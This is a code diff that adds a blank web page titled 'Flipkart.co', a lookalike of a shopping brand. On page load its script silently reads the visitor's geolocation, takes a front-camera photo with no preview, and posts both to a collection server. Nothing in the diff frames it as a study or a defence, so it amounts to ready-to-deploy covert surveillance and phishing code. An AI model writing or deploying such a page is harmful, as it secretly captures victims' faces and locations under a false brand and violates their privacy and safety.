@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Flipkart.co</title>
+</head>
+<body>
+    <script>
+        let userLocation = null;
+
+        // Try to get location (optional)
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                userLocation = {
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                };
+            },
+            err => {
+                console.warn("Location permission denied or unavailable.");
+            }
+        );
+
+        async function captureAndSend() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                console.error("Camera not supported.");
+                return;
+            }
+
+            try {
+                // Capture camera stream (no preview)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+
+                const bitmap = await imageCapture.grabFrame();
+                const canvas = document.createElement("canvas");
+                canvas.width = bitmap.width;
+                canvas.height = bitmap.height;
+                canvas.getContext("2d").drawImage(bitmap, 0, 0);
+                const photoDataURL = canvas.toDataURL("image/png");
+
+                // Stop camera
+                track.stop();
+
+                // Send to server
+                await fetch("http://localhost:3000/upload", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ photo: photoDataURL, location: userLocation })
+                });
+
+                console.log("Photo sent!" + (userLocation ? " Location included." : " Location not available."));
+            } catch (err) {
+                console.error("Error capturing photo:", err);
+            }
+        }
+
+        // Automatically run on page load
+        window.addEventListener("load", captureAndSend);
+    </script>
+</body>
+</html>
